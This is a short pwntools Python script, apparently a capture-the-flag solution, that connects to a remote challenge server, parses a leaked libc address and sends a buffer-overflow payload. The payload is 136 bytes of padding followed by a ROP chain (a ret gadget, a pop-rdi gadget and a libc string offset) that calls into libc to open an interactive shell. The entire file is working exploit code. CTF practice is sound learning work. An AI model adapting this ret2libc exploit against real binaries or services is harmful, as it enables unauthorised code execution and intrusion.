from pwn import *


#sys420
#
target=0x404020
context.update(arch="amd64", os="linux")
context.log_level = "debug"
context.terminal = ["qterminal", "-e"]
p = remote("node4.anna.nssctf.cn", 28909)
#p=process('./SWPU')
#gdb.attach(p,'b* 04012DA')
p.recvuntil('0x')
addr=int(p.recv(12),16)
libc=addr-0x04f420
log.info("libc addr = %#x" % (libc))
padding=b'a'*136
rdi_ret=0x401373
ret=p64(0x40101a)
payload=padding+ret+p64(rdi_ret)+p64(libc+0x1b3d88)+p64(addr)
p.send(payload)
p.interactive()